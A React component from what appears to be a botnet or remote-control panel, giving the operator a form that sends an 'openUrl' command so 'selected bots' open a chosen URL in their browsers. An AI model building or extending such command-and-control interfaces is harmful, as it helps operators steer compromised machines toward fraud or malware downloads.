import React from 'react';
import SettingsContext from '../../Settings';


//{"this":"~command~","name":"openUrl","url":"https://yandex.ru"}
class OpenLink extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          url: ''
        }
    }

    onChangeUrl = (e) => {
        this.setState({ 
            url: e.target.value.substring(0,40)
        });
    }

    onClickOpenURL = (e) => {
        SettingsContext.BotSendCommand('{"name":"openUrl","url":"' + this.state.url + '"}');
        this.setState({ 
            url: ''
        });
    }

    render () {
        return (
            <React.Fragment>
                <div class="card">
                <div class="card-body">
                    <h5 class="card-title">Open URL</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Open URL in browser on selected bots</h6>
                    <p class="card-text">
                        <input class="form-control" value={this.state.url} onChange={this.onChangeUrl} placeholder="https://google.com/" />
                    </p>
                    <button type="button" onClick={this.onClickOpenURL} class="btn btn-right btn-outline-success">Open URL on BOTS</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default OpenLink;